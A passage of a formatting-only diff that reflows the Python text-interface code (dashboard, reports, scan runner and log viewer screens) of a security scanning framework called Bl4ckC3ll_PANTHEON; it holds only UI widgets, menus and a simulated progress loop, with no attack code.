memory_bar.progress = self.memory_usage\n             disk_bar.progress = self.disk_usage\n-            \n+\n         except Exception as e:\n             # Fallback for systems without psutil or other errors\n             pass\n \n \n class StatusOverview(Static):\n     \"\"\"Current status and recent activity overview\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Status Overview\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             yield Label(\"Framework Status: READY\", classes=\"status-ready\")\n             yield Label(\"Last Scan: None\", classes=\"info-item\")\n-            yield Label(\"Active Targets: 0\", classes=\"info-item\") \n+            yield Label(\"Active Targets: 0\", classes=\"info-item\")\n             yield Label(\"Available Tools: Checking...\", classes=\"info-item\")\n             yield Label(\"Reports Generated: 0\", classes=\"info-item\")\n             yield Label(\"Plugins Loaded: 0\", classes=\"info-item\")\n-            \n+\n     def on_mount(self):\n         \"\"\"Initialize status display\"\"\"\n         self.set_interval(5.0, self.update_status)\n-        \n+\n     def update_status(self):\n         \"\"\"Update status information\"\"\"\n         # This would connect to the main application state\n         pass\n \n \n class QuickActionsPanel(Static):\n     \"\"\"Quick action buttons for common operations\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Quick Actions\", classes=\"widget-title\")\n-        \n+\n         with Vertical(classes=\"quick-actions\"):\n             yield Button(\"Start Full Scan\", variant=\"primary\", id=\"btn-full-scan\")\n-            yield Button(\"Quick Reconnaissance\", variant=\"default\", id=\"btn-quick-recon\") \n+            yield Button(\n+                \"Quick Reconnaissance\", variant=\"default\", id=\"btn-quick-recon\"\n+            )\n             yield Button(\"Vulnerability Scan\", variant=\"warning\", id=\"btn-vuln-scan\")\n             yield Button(\"Generate Report\", variant=\"success\", id=\"btn-report\")\n             yield Button(\"View Last Results\", variant=\"default\", id=\"btn-view-results\")\n             yield Button(\"Open Settings\", variant=\"default\", id=\"btn-settings\")\n-            \n+\n     @on(Button.Pressed, \"#btn-full-scan\")\n     def start_full_scan(self):\n         \"\"\"Start a full security scan\"\"\"\n         if HAS_BACKEND and scan_manager:\n             success = scan_manager.start_full_scan()\n@@ -140,76 +151,78 @@\n             else:\n                 # Show error message\n                 pass\n         else:\n             self.app.action_scan()\n-        \n-    @on(Button.Pressed, \"#btn-quick-recon\")  \n+\n+    @on(Button.Pressed, \"#btn-quick-recon\")\n     def quick_recon(self):\n         \"\"\"Start quick reconnaissance\"\"\"\n         if HAS_BACKEND and scan_manager:\n             success = scan_manager.start_recon_scan()\n             if success:\n                 self.app.action_scan()\n         else:\n             self.app.action_scan()\n-        \n+\n     @on(Button.Pressed, \"#btn-vuln-scan\")\n     def vuln_scan(self):\n         \"\"\"Start vulnerability scan\"\"\"\n         if HAS_BACKEND and scan_manager:\n             success = scan_manager.start_vuln_scan()\n             if success:\n                 self.app.action_scan()\n         else:\n             self.app.action_scan()\n-        \n+\n     @on(Button.Pressed, \"#btn-report\")\n     def generate_report(self):\n         \"\"\"Generate security report\"\"\"\n         self.app.action_reports()\n-        \n+\n     @on(Button.Pressed, \"#btn-view-results\")\n     def view_results(self):\n         \"\"\"View last scan results\"\"\"\n         self.app.action_reports()\n-        \n+\n     @on(Button.Pressed, \"#btn-settings\")\n     def open_settings(self):\n         \"\"\"Open settings\"\"\"\n         self.app.action_settings()\n \n \n class RecentActivity(Static):\n     \"\"\"Display recent scan activity and logs\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Recent Activity\", classes=\"widget-title\")\n-        \n+\n         # Create a simple table for recent activities\n         table = DataTable()\n         table.add_columns(\"Time\", \"Action\", \"Status\")\n-        \n+\n         # Add some sample data\n-        table.add_rows([\n-            (datetime.now().strftime(\"%H:%M:%S\"), \"System Startup\", \"Complete\"),\n-            (datetime.now().strftime(\"%H:%M:%S\"), \"Dependencies Check\", \"Warning\"),\n-            (datetime.now().strftime(\"%H:%M:%S\"), \"Configuration Load\", \"Success\"),\n-        ])\n-        \n+        table.add_rows(\n+            [\n+                (datetime.now().strftime(\"%H:%M:%S\"), \"System Startup\", \"Complete\"),\n+                (datetime.now().strftime(\"%H:%M:%S\"), \"Dependencies Check\", \"Warning\"),\n+                (datetime.now().strftime(\"%H:%M:%S\"), \"Configuration Load\", \"Success\"),\n+            ]\n+        )\n+\n         yield table\n \n \n class MainDashboard(Container):\n     \"\"\"Main dashboard layout with multiple information panels\"\"\"\n-    \n+\n     def compose(self):\n         with Grid(id=\"dashboard-grid\"):\n             yield SystemInfoWidget(classes=\"dashboard-panel\")\n             yield ResourceMonitor(classes=\"dashboard-panel\")\n-            yield StatusOverview(classes=\"dashboard-panel\")  \n+            yield StatusOverview(classes=\"dashboard-panel\")\n             yield QuickActionsPanel(classes=\"dashboard-panel\")\n             yield RecentActivity(classes=\"dashboard-panel span-col-2\")\n-            \n+\n     def on_mount(self):\n         \"\"\"Initialize dashboard\"\"\"\n-        pass\n\\ No newline at end of file\n+        pass\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/reports.py\t2025-09-14 19:10:58.581755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/reports.py\t2025-09-14 19:23:14.751751+00:00\n@@ -1,7 +1,7 @@\n \"\"\"\n-Reports Management Screen for Bl4ckC3ll_PANTHEON TUI  \n+Reports Management Screen for Bl4ckC3ll_PANTHEON TUI\n View and manage security assessment reports\n \"\"\"\n \n from textual.containers import Container, Horizontal, Vertical\n from textual.widgets import Static, Button, Label, DataTable, Tree, Select\n@@ -12,29 +12,31 @@\n import json\n \n \n class ReportListPanel(Static):\n     \"\"\"Display available security reports\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Available Reports\", classes=\"widget-title\")\n-        \n+\n         # Create reports table\n         table = DataTable(id=\"reports-table\")\n-        table.add_columns(\"Report ID\", \"Date\", \"Targets\", \"Risk Level\", \"Vulnerabilities\")\n-        \n+        table.add_columns(\n+            \"Report ID\", \"Date\", \"Targets\", \"Risk Level\", \"Vulnerabilities\"\n+        )\n+\n         # Load existing reports\n         self.load_reports(table)\n-        \n+\n         yield table\n-        \n+\n         with Horizontal():\n             yield Button(\"View Report\", variant=\"primary\", id=\"btn-view-report\")\n             yield Button(\"Export HTML\", variant=\"success\", id=\"btn-export-html\")\n             yield Button(\"Export PDF\", variant=\"default\", id=\"btn-export-pdf\")\n             yield Button(\"Delete Report\", variant=\"error\", id=\"btn-delete-report\")\n-            \n+\n     def load_reports(self, table):\n         \"\"\"Load available reports from runs directory\"\"\"\n         try:\n             runs_dir = Path(__file__).parent.parent.parent / \"runs\"\n             if runs_dir.exists():\n@@ -42,198 +44,254 @@\n                     if run_dir.is_dir():\n                         report_file = run_dir / \"report\" / \"report.json\"\n                         if report_file.exists():\n                             try:\n                                 report_data = json.loads(report_file.read_text())\n-                                \n-                                run_id = report_data.get('run_id', run_dir.name)\n-                                date = report_data.get('timestamp', 'Unknown')\n-                                targets = str(report_data.get('executive_summary', {}).get('targets_scanned', 0))\n-                                risk_level = report_data.get('risk_assessment', {}).get('risk_level', 'Unknown')\n-                                \n-                                severity_counts = report_data.get('risk_assessment', {}).get('severity_breakdown', {})\n+\n+                                run_id = report_data.get(\"run_id\", run_dir.name)\n+                                date = report_data.get(\"timestamp\", \"Unknown\")\n+                                targets = str(\n+                                    report_data.get(\"executive_summary\", {}).get(\n+                                        \"targets_scanned\", 0\n+                                    )\n+                                )\n+                                risk_level = report_data.get(\"risk_assessment\", {}).get(\n+                                    \"risk_level\", \"Unknown\"\n+                                )\n+\n+                                severity_counts = report_data.get(\n+                                    \"risk_assessment\", {}\n+                                ).get(\"severity_breakdown\", {})\n                                 total_vulns = sum(severity_counts.values())\n-                                \n-                                table.add_row(run_id, date, targets, risk_level, str(total_vulns))\n-                                \n+\n+                                table.add_row(\n+                                    run_id, date, targets, risk_level, str(total_vulns)\n+                                )\n+\n                             except Exception:\n                                 # Skip invalid reports\n                                 continue\n         except Exception as e:\n             logging.warning(f\"Operation failed: {e}\")\n             # Consider if this error should be handled differently\n+\n     @on(Button.Pressed, \"#btn-view-report\")\n     def view_selected_report(self):\n         \"\"\"View the selected report\"\"\"\n         table = self.query_one(\"#reports-table\", DataTable)\n         if table.cursor_row is not None:\n             row = table.get_row(table.cursor_row)\n             report_id = row[0]\n-            \n+\n             # Switch to report viewer\n             viewer = self.parent.query_one(\"#report-viewer\")\n             viewer.load_report(report_id)\n-            \n+\n     @on(Button.Pressed, \"#btn-export-html\")\n     def export_html_report(self):\n         \"\"\"Export selected report as HTML\"\"\"\n         # Implementation for HTML export\n         pass\n-        \n-    @on(Button.Pressed, \"#btn-export-pdf\") \n+\n+    @on(Button.Pressed, \"#btn-export-pdf\")\n     def export_pdf_report(self):\n         \"\"\"Export selected report as PDF\"\"\"\n         # Implementation for PDF export\n         pass\n-        \n+\n     @on(Button.Pressed, \"#btn-delete-report\")\n     def delete_selected_report(self):\n         \"\"\"Delete the selected report\"\"\"\n         table = self.query_one(\"#reports-table\", DataTable)\n         if table.cursor_row is not None:\n             table.remove_row(table.cursor_row)\n \n \n class ReportViewer(Static):\n     \"\"\"Display detailed report information\"\"\"\n-    \n+\n     def __init__(self, **kwargs):\n         super().__init__(**kwargs)\n         self.current_report = None\n-        \n+\n     def compose(self):\n         yield Label(\"Report Viewer\", classes=\"widget-title\")\n-        \n+\n         with Vertical(id=\"report-content\"):\n             yield Label(\"Select a report to view details\", classes=\"placeholder-text\")\n-            \n+\n     def load_report(self, report_id):\n         \"\"\"Load and display a specific report\"\"\"\n         try:\n             runs_dir = Path(__file__).parent.parent.parent / \"runs\"\n             report_file = None\n-            \n+\n             # Find the report file\n             for run_dir in runs_dir.iterdir():\n-                if run_dir.is_dir() and (run_dir.name == report_id or report_id in run_dir.name):\n+                if run_dir.is_dir() and (\n+                    run_dir.name == report_id or report_id in run_dir.name\n+                ):\n                     report_file = run_dir / \"report\" / \"report.json\"\n                     break\n-                    \n+\n             if not report_file or not report_file.exists():\n                 self.show_error(\"Report file not found\")\n                 return\n-                \n+\n             report_data = json.loads(report_file.read_text())\n             self.current_report = report_data\n-            \n+\n             # Clear existing content\n             content_container = self.query_one(\"#report-content\")\n             content_container.remove_children()\n-            \n+\n             # Display report summary\n-            content_container.mount(Label(f\"Report: {report_data.get('run_id', 'Unknown')}\", classes=\"report-title\"))\n-            content_container.mount(Label(f\"Generated: {report_data.get('timestamp', 'Unknown')}\", classes=\"report-meta\"))\n-            \n+            content_container.mount(\n+                Label(\n+                    f\"Report: {report_data.get('run_id', 'Unknown')}\",\n+                    classes=\"report-title\",\n+                )\n+            )\n+            content_container.mount(\n+                Label(\n+                    f\"Generated: {report_data.get('timestamp', 'Unknown')}\",\n+                    classes=\"report-meta\",\n+                )\n+            )\n+\n             # Executive Summary\n-            exec_summary = report_data.get('executive_summary', {})\n+            exec_summary = report_data.get(\"executive_summary\", {})\n             if exec_summary:\n-                content_container.mount(Label(\"Executive Summary\", classes=\"section-title\"))\n-                content_container.mount(Label(f\"Targets Scanned: {exec_summary.get('targets_scanned', 0)}\"))\n-                content_container.mount(Label(f\"Subdomains Found: {exec_summary.get('subdomains_discovered', 0)}\"))\n-                content_container.mount(Label(f\"Open Ports: {exec_summary.get('open_ports_found', 0)}\"))\n-                content_container.mount(Label(f\"HTTP Services: {exec_summary.get('http_services_identified', 0)}\"))\n-                \n+                content_container.mount(\n+                    Label(\"Executive Summary\", classes=\"section-title\")\n+                )\n+                content_container.mount(\n+                    Label(f\"Targets Scanned: {exec_summary.get('targets_scanned', 0)}\")\n+                )\n+                content_container.mount(\n+                    Label(\n+                        f\"Subdomains Found: {exec_summary.get('subdomains_discovered', 0)}\"\n+                    )\n+                )\n+                content_container.mount(\n+                    Label(f\"Open Ports: {exec_summary.get('open_ports_found', 0)}\")\n+                )\n+                content_container.mount(\n+                    Label(\n+                        f\"HTTP Services: {exec_summary.get('http_services_identified', 0)}\"\n+                    )\n+                )\n+\n             # Risk Assessment\n-            risk_assessment = report_data.get('risk_assessment', {})\n+            risk_assessment = report_data.get(\"risk_assessment\", {})\n             if risk_assessment:\n-                content_container.mount(Label(\"Risk Assessment\", classes=\"section-title\"))\n-                content_container.mount(Label(f\"Overall Risk Level: {risk_assessment.get('risk_level', 'Unknown')}\"))\n-                \n-                severity_counts = risk_assessment.get('severity_breakdown', {})\n+                content_container.mount(\n+                    Label(\"Risk Assessment\", classes=\"section-title\")\n+                )\n+                content_container.mount(\n+                    Label(\n+                        f\"Overall Risk Level: {risk_assessment.get('risk_level', 'Unknown')}\"\n+                    )\n+                )\n+\n+                severity_counts = risk_assessment.get(\"severity_breakdown\", {})\n                 if severity_counts:\n-                    content_container.mount(Label(\"Vulnerability Breakdown:\", classes=\"subsection-title\"))\n+                    content_container.mount(\n+                        Label(\"Vulnerability Breakdown:\", classes=\"subsection-title\")\n+                    )\n                     for severity, count in severity_counts.items():\n                         if count > 0:\n-                            content_container.mount(Label(f\"  {severity.title()}: {count}\"))\n-                            \n+                            content_container.mount(\n+                                Label(f\"  {severity.title()}: {count}\")\n+                            )\n+\n             # Key Findings\n-            key_findings = exec_summary.get('key_findings', [])\n+            key_findings = exec_summary.get(\"key_findings\", [])\n             if key_findings:\n                 content_container.mount(Label(\"Key Findings\", classes=\"section-title\"))\n                 for finding in key_findings[:10]:  # Show top 10\n                     content_container.mount(Label(f\"\u2022 {finding}\"))\n-                    \n+\n         except Exception as e:\n             self.show_error(f\"Error loading report: {e}\")\n-            \n+\n     def show_error(self, message):\n         \"\"\"Show error message in viewer\"\"\"\n         content_container = self.query_one(\"#report-content\")\n         content_container.remove_children()\n         content_container.mount(Label(f\"Error: {message}\", classes=\"error-text\"))\n \n \n class ReportFiltersPanel(Static):\n     \"\"\"Filter and search reports\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Report Filters\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             yield Label(\"Filter by Risk Level:\", classes=\"form-label\")\n-            yield Select([\n-                (\"All Levels\", \"all\"),\n-                (\"Critical\", \"critical\"),\n-                (\"High\", \"high\"), \n-                (\"Medium\", \"medium\"),\n-                (\"Low\", \"low\"),\n-                (\"Informational\", \"informational\")\n-            ], id=\"risk-filter\")\n-            \n+            yield Select(\n+                [\n+                    (\"All Levels\", \"all\"),\n+                    (\"Critical\", \"critical\"),\n+                    (\"High\", \"high\"),\n+                    (\"Medium\", \"medium\"),\n+                    (\"Low\", \"low\"),\n+                    (\"Informational\", \"informational\"),\n+                ],\n+                id=\"risk-filter\",\n+            )\n+\n             yield Label(\"Filter by Date Range:\", classes=\"form-label\")\n-            yield Select([\n-                (\"All Time\", \"all\"),\n-                (\"Last 24 Hours\", \"24h\"),\n-                (\"Last Week\", \"week\"),\n-                (\"Last Month\", \"month\"),\n-                (\"Last Year\", \"year\")\n-            ], id=\"date-filter\")\n-            \n+            yield Select(\n+                [\n+                    (\"All Time\", \"all\"),\n+                    (\"Last 24 Hours\", \"24h\"),\n+                    (\"Last Week\", \"week\"),\n+                    (\"Last Month\", \"month\"),\n+                    (\"Last Year\", \"year\"),\n+                ],\n+                id=\"date-filter\",\n+            )\n+\n             yield Label(\"Sort Order:\", classes=\"form-label\")\n-            yield Select([\n-                (\"Newest First\", \"newest\"),\n-                (\"Oldest First\", \"oldest\"),\n-                (\"Risk Level\", \"risk\"),\n-                (\"Target Count\", \"targets\")\n-            ], id=\"sort-order\")\n-            \n+            yield Select(\n+                [\n+                    (\"Newest First\", \"newest\"),\n+                    (\"Oldest First\", \"oldest\"),\n+                    (\"Risk Level\", \"risk\"),\n+                    (\"Target Count\", \"targets\"),\n+                ],\n+                id=\"sort-order\",\n+            )\n+\n             with Horizontal():\n                 yield Button(\"Apply Filters\", variant=\"primary\", id=\"btn-apply-filters\")\n                 yield Button(\"Reset\", variant=\"default\", id=\"btn-reset-filters\")\n-                \n+\n     @on(Button.Pressed, \"#btn-apply-filters\")\n     def apply_filters(self):\n         \"\"\"Apply selected filters to report list\"\"\"\n         # Implementation for filtering reports\n         pass\n-        \n+\n     @on(Button.Pressed, \"#btn-reset-filters\")\n     def reset_filters(self):\n         \"\"\"Reset all filters to default\"\"\"\n         # Reset all select widgets to default values\n         pass\n \n \n class ReportsScreen(Container):\n     \"\"\"Main reports management screen\"\"\"\n-    \n+\n     def compose(self):\n         with Horizontal():\n             with Vertical(classes=\"left-panel\"):\n                 yield ReportListPanel()\n                 yield ReportFiltersPanel()\n-                \n+\n             yield ReportViewer(id=\"report-viewer\", classes=\"right-panel\")\n-            \n+\n     def on_mount(self):\n         \"\"\"Initialize reports screen\"\"\"\n-        pass\n\\ No newline at end of file\n+        pass\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/scan_runner.py\t2025-09-14 19:10:58.581755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/scan_runner.py\t2025-09-14 19:23:14.802231+00:00\n@@ -13,113 +13,129 @@\n from datetime import datetime\n \n # Import backend integration\n try:\n     from ..backend_integration import scan_manager, target_manager\n+\n     HAS_BACKEND = True\n except ImportError:\n     HAS_BACKEND = False\n \n \n class ScanConfigPanel(Static):\n     \"\"\"Scan configuration and options panel\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Scan Configuration\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             yield Label(\"Scan Type:\", classes=\"form-label\")\n-            yield Select([\n-                (\"Quick Scan\", \"quick\"),\n-                (\"Full Pipeline\", \"full\"), \n-                (\"Reconnaissance Only\", \"recon\"),\n-                (\"Vulnerability Scan Only\", \"vuln\"),\n-                (\"API Security Test\", \"api\"),\n-                (\"Cloud Security Assessment\", \"cloud\"),\n-                (\"BCAR Enhanced Recon\", \"bcar\"),\n-                (\"Subdomain Takeover\", \"takeover\"),\n-                (\"Advanced Fuzzing\", \"fuzz\"),\n-                (\"Payload Injection\", \"payload\")\n-            ], id=\"scan-type\")\n-            \n+            yield Select(\n+                [\n+                    (\"Quick Scan\", \"quick\"),\n+                    (\"Full Pipeline\", \"full\"),\n+                    (\"Reconnaissance Only\", \"recon\"),\n+                    (\"Vulnerability Scan Only\", \"vuln\"),\n+                    (\"API Security Test\", \"api\"),\n+                    (\"Cloud Security Assessment\", \"cloud\"),\n+                    (\"BCAR Enhanced Recon\", \"bcar\"),\n+                    (\"Subdomain Takeover\", \"takeover\"),\n+                    (\"Advanced Fuzzing\", \"fuzz\"),\n+                    (\"Payload Injection\", \"payload\"),\n+                ],\n+                id=\"scan-type\",\n+            )\n+\n             yield Label(\"Target Input:\", classes=\"form-label\")\n             yield Input(placeholder=\"Enter target domain or IP\", id=\"target-input\")\n-            \n+\n             yield Label(\"Advanced Options:\", classes=\"form-label\")\n-            yield Select([\n-                (\"Default Settings\", \"default\"),\n-                (\"Aggressive Mode\", \"aggressive\"),\n-                (\"Stealth Mode\", \"stealth\"),\n-                (\"Custom Configuration\", \"custom\")\n-            ], id=\"scan-options\")\n+            yield Select(\n+                [\n+                    (\"Default Settings\", \"default\"),\n+                    (\"Aggressive Mode\", \"aggressive\"),\n+                    (\"Stealth Mode\", \"stealth\"),\n+                    (\"Custom Configuration\", \"custom\"),\n+                ],\n+                id=\"scan-options\",\n+            )\n \n \n class ScanControlPanel(Static):\n     \"\"\"Scan control buttons and actions\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Scan Controls\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             with Horizontal():\n                 yield Button(\"Start Scan\", variant=\"primary\", id=\"btn-start-scan\")\n-                yield Button(\"Stop Scan\", variant=\"error\", id=\"btn-stop-scan\", disabled=True)\n-                \n+                yield Button(\n+                    \"Stop Scan\", variant=\"error\", id=\"btn-stop-scan\", disabled=True\n+                )\n+\n             with Horizontal():\n-                yield Button(\"Pause Scan\", variant=\"warning\", id=\"btn-pause-scan\", disabled=True)\n-                yield Button(\"Resume Scan\", variant=\"success\", id=\"btn-resume-scan\", disabled=True)\n-                \n+                yield Button(\n+                    \"Pause Scan\", variant=\"warning\", id=\"btn-pause-scan\", disabled=True\n+                )\n+                yield Button(\n+                    \"Resume Scan\",\n+                    variant=\"success\",\n+                    id=\"btn-resume-scan\",\n+                    disabled=True,\n+                )\n+\n             yield Button(\"View Live Logs\", variant=\"default\", id=\"btn-view-logs\")\n             yield Button(\"Export Results\", variant=\"default\", id=\"btn-export-results\")\n-            \n+\n     @on(Button.Pressed, \"#btn-start-scan\")\n     def start_scan(self):\n         \"\"\"Start the security scan\"\"\"\n         # Get scan configuration\n         scan_type_select = self.parent.query_one(\"#scan-type\", Select)\n         target_input = self.parent.query_one(\"#target-input\", Input)\n-        \n+\n         scan_type = scan_type_select.value if scan_type_select else \"full\"\n         target = target_input.value.strip() if target_input else \"\"\n-        \n+\n         # Enable/disable buttons\n         self.query_one(\"#btn-start-scan\").disabled = True\n         self.query_one(\"#btn-stop-scan\").disabled = False\n         self.query_one(\"#btn-pause-scan\").disabled = False\n-        \n+\n         # Start scan using backend if available\n         if HAS_BACKEND and scan_manager:\n             # Set up progress callback\n             scan_progress = self.parent.query_one(\"#scan-progress\")\n             scan_manager.set_progress_callback(scan_progress.update_from_backend)\n-            \n+\n             # Start appropriate scan type\n             if scan_type == \"recon\":\n                 success = scan_manager.start_recon_scan([target] if target else None)\n-            elif scan_type == \"vuln\":  \n+            elif scan_type == \"vuln\":\n                 success = scan_manager.start_vuln_scan([target] if target else None)\n             else:\n                 success = scan_manager.start_full_scan([target] if target else None)\n-                \n+\n             if not success:\n                 # Re-enable start button if scan failed to start\n                 self.query_one(\"#btn-start-scan\").disabled = False\n                 self.query_one(\"#btn-stop-scan\").disabled = True\n                 self.query_one(\"#btn-pause-scan\").disabled = True\n         else:\n             # Start simulated scan\n             scan_runner = self.parent.query_one(\"#scan-progress\")\n             scan_runner.start_scan()\n-        \n+\n     @on(Button.Pressed, \"#btn-stop-scan\")\n     def stop_scan(self):\n         \"\"\"Stop the current scan\"\"\"\n         self.query_one(\"#btn-start-scan\").disabled = False\n         self.query_one(\"#btn-stop-scan\").disabled = True\n         self.query_one(\"#btn-pause-scan\").disabled = True\n         self.query_one(\"#btn-resume-scan\").disabled = True\n-        \n+\n         # Stop scan using backend if available\n         if HAS_BACKEND and scan_manager:\n             scan_manager.stop_scan()\n         else:\n             # Stop simulated scan\n@@ -127,58 +143,60 @@\n             scan_runner.stop_scan()\n \n \n class ScanProgressPanel(Static):\n     \"\"\"Real-time scan progress display\"\"\"\n-    \n+\n     def __init__(self, **kwargs):\n         super().__init__(**kwargs)\n         self.scan_active = False\n         self.current_phase = \"Idle\"\n         self.progress_thread = None\n-        \n+\n     def compose(self):\n         yield Label(\"Scan Progress\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             yield Label(\"Status: Idle\", id=\"scan-status\", classes=\"status-idle\")\n             yield Label(\"Phase: Not Started\", id=\"current-phase\")\n             yield Label(\"Targets: 0\", id=\"target-count\")\n             yield Label(\"Elapsed Time: 00:00:00\", id=\"elapsed-time\")\n-            \n+\n             yield Label(\"Overall Progress:\", classes=\"form-label\")\n             yield ProgressBar(total=100, show_percentage=True, id=\"overall-progress\")\n-            \n-            yield Label(\"Current Phase Progress:\", classes=\"form-label\") \n+\n+            yield Label(\"Current Phase Progress:\", classes=\"form-label\")\n             yield ProgressBar(total=100, show_percentage=True, id=\"phase-progress\")\n-            \n+\n             yield Label(\"Phase Details:\", classes=\"form-label\")\n             yield Static(\"Waiting to start...\", id=\"phase-details\")\n-            \n+\n     def start_scan(self):\n         \"\"\"Start scan progress monitoring\"\"\"\n         self.scan_active = True\n         self.query_one(\"#scan-status\").update(\"Status: Running\")\n         self.query_one(\"#scan-status\").classes = \"status-running\"\n-        \n+\n         # Start progress monitoring thread\n-        self.progress_thread = threading.Thread(target=self._progress_monitor, daemon=True)\n+        self.progress_thread = threading.Thread(\n+            target=self._progress_monitor, daemon=True\n+        )\n         self.progress_thread.start()\n-        \n+\n     def stop_scan(self):\n         \"\"\"Stop scan progress monitoring\"\"\"\n         self.scan_active = False\n         self.query_one(\"#scan-status\").update(\"Status: Stopped\")\n         self.query_one(\"#scan-status\").classes = \"status-stopped\"\n-        \n+\n     def update_from_backend(self, progress, phase, status):\n         \"\"\"Update progress from backend scan manager\"\"\"\n         self.query_one(\"#scan-status\").update(f\"Status: {status}\")\n         self.query_one(\"#current-phase\").update(f\"Phase: {phase}\")\n         self.query_one(\"#phase-details\").update(f\"Executing: {phase}\")\n         self.query_one(\"#overall-progress\").progress = progress\n-        \n+\n         # Update status classes for styling\n         status_widget = self.query_one(\"#scan-status\")\n         if status == \"Running\":\n             status_widget.classes = \"status-running\"\n         elif status in [\"Complete\", \"Completed\"]:\n@@ -187,86 +205,88 @@\n             status_widget.classes = \"status-error\"\n         elif status in [\"Stopped\"]:\n             status_widget.classes = \"status-stopped\"\n         else:\n             status_widget.classes = \"status-idle\"\n-            \n+\n     def _progress_monitor(self):\n         \"\"\"Monitor scan progress in background\"\"\"\n         phases = [\n             \"Initializing scan environment\",\n-            \"Loading target configuration\", \n+            \"Loading target configuration\",\n             \"Starting reconnaissance phase\",\n             \"Subdomain enumeration\",\n-            \"Port scanning\", \n+            \"Port scanning\",\n             \"HTTP service discovery\",\n             \"Vulnerability scanning\",\n             \"Generating report\",\n-            \"Scan complete\"\n+            \"Scan complete\",\n         ]\n-        \n+\n         phase_idx = 0\n         progress = 0\n-        \n+\n         while self.scan_active and phase_idx < len(phases):\n             # Update current phase\n             self.current_phase = phases[phase_idx]\n             self.query_one(\"#current-phase\").update(f\"Phase: {self.current_phase}\")\n             self.query_one(\"#phase-details\").update(f\"Executing: {self.current_phase}\")\n-            \n+\n             # Simulate phase progress\n             for i in range(101):\n                 if not self.scan_active:\n                     break\n-                    \n+\n                 # Update progress bars\n                 overall_progress = (phase_idx * 100 + i) // len(phases)\n                 self.query_one(\"#overall-progress\").progress = overall_progress\n                 self.query_one(\"#phase-progress\").progress = i\n-                \n+\n                 time.sleep(0.1)\n-                \n+\n             phase_idx += 1\n-            \n+\n         if self.scan_active:\n             self.query_one(\"#scan-status\").update(\"Status: Complete\")\n             self.query_one(\"#scan-status\").classes = \"status-complete\"\n             self.scan_active = False\n \n \n class LiveLogsPanel(Static):\n     \"\"\"Live log display during scanning\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"Live Scan Logs\", classes=\"widget-title\")\n-        \n+\n         log_widget = Log(id=\"scan-logs\")\n-        log_widget.write_line(\"Bl4ckC3ll PANTHEON - Advanced Security Testing Framework\")\n+        log_widget.write_line(\n+            \"Bl4ckC3ll PANTHEON - Advanced Security Testing Framework\"\n+        )\n         log_widget.write_line(\"Ready to start security assessment...\")\n         log_widget.write_line(\"\")\n-        \n+\n         yield log_widget\n-        \n+\n     def add_log_entry(self, message, level=\"INFO\"):\n         \"\"\"Add a new log entry\"\"\"\n         timestamp = datetime.now().strftime(\"%H:%M:%S\")\n         log_widget = self.query_one(\"#scan-logs\")\n         log_widget.write_line(f\"[{timestamp}] {level}: {message}\")\n \n \n class ScanRunner(Container):\n     \"\"\"Main scan runner interface\"\"\"\n-    \n+\n     def compose(self):\n         with Horizontal():\n             with Vertical(classes=\"left-panel\"):\n                 yield ScanConfigPanel()\n                 yield ScanControlPanel()\n-                \n+\n             with Vertical(classes=\"right-panel\"):\n                 yield ScanProgressPanel(id=\"scan-progress\")\n-                \n+\n         yield LiveLogsPanel()\n-        \n+\n     def on_mount(self):\n         \"\"\"Initialize scan runner\"\"\"\n-        pass\n\\ No newline at end of file\n+        pass\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/__init__.py\t2025-09-14 19:10:58.581755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/__init__.py\t2025-09-14 19:23:14.807749+00:00\n@@ -1 +1 @@\n-# TUI Widgets\n\\ No newline at end of file\n+# TUI Widgets\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/log_viewer.py\t2025-09-14 19:10:58.581755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/log_viewer.py\t2025-09-14 19:23:14.902035+00:00\n@@ -11,72 +11,76 @@\n import queue\n \n \n class LogViewer(Static):\n     \"\"\"Advanced log viewing widget with filtering and search\"\"\"\n-    \n+\n     def __init__(self, **kwargs):\n         super().__init__(**kwargs)\n         self.log_queue = queue.Queue()\n         self.filter_level = \"ALL\"\n-        \n+\n     def compose(self):\n         yield Label(\"System Logs\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             with Horizontal():\n-                yield Select([\n-                    (\"All Levels\", \"ALL\"),\n-                    (\"Error\", \"ERROR\"),\n-                    (\"Warning\", \"WARNING\"), \n-                    (\"Info\", \"INFO\"),\n-                    (\"Debug\", \"DEBUG\")\n-                ], value=\"ALL\", id=\"log-level-filter\")\n-                \n+                yield Select(\n+                    [\n+                        (\"All Levels\", \"ALL\"),\n+                        (\"Error\", \"ERROR\"),\n+                        (\"Warning\", \"WARNING\"),\n+                        (\"Info\", \"INFO\"),\n+                        (\"Debug\", \"DEBUG\"),\n+                    ],\n+                    value=\"ALL\",\n+                    id=\"log-level-filter\",\n+                )\n+\n                 yield 